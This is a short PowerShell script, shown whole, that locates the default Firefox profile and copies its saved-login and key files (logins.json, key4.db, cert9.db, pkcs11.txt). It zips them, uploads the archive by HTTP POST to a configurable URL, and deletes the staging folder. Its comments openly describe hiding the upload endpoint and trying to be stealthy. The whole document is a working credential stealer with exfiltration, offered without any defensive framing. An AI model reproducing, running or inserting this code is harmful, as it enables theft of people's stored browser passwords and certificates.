param (
    [string]$UploadUrl = "http://127.0.0.1:8080/upload", # tricky way to hide upload endpoint
    [string]$TempDir = "$env:TEMP\firefox_dump",
    [string]$OutputZip = "$env:TEMP\firefox_export.zip"
)

# Looking for FF profiles
$profilesIni = "$env:APPDATA\Mozilla\Firefox\profiles.ini"
if (!(Test-Path $profilesIni)) {
    Write-Error "profiles.ini not found, u sure dawg ff is installed?"
    exit 1
}

# Very lousy, bad and generally lame way to find def profile
$profilePath = Select-String -Path $profilesIni -Pattern "^Path=(.+)" | Select-Object -First 1 | ForEach-Object {
    Join-Path "$env:APPDATA\Mozilla\Firefox" $_.Matches[0].Groups[1].Value
}

if (!(Test-Path $profilePath)) {
    Write-Error "no profile, no work, thxbye"
    exit 1
}

# Preparing upload package
New-Item -ItemType Directory -Force -Path $TempDir | Out-Null

$filesToCopy = @("logins.json", "key4.db", "cert9.db", "pkcs11.txt")
foreach ($file in $filesToCopy) {
    $src = Join-Path $profilePath $file
    if (Test-Path $src) {
        Copy-Item -Path $src -Destination $TempDir -Force
    }
}

# packing packing packing
if (Test-Path $OutputZip) { Remove-Item $OutputZip -Force }
Compress-Archive -Path "$TempDir\*" -DestinationPath $OutputZip

# FIRE DA LAZOR!!!! (upload)
Write-Host "Uploading file: $OutputZip"

$resp = Invoke-WebRequest -Uri $UploadUrl -Method POST -InFile "$OutputZip" -ContentType "application/zip" -UseBasicParsing

Write-Host "You know what? I'll tell you what. Status: $($resp.StatusCode)"

# Trying to be stealth, but this is lame as well
Remove-Item $TempDir -Recurse -Force
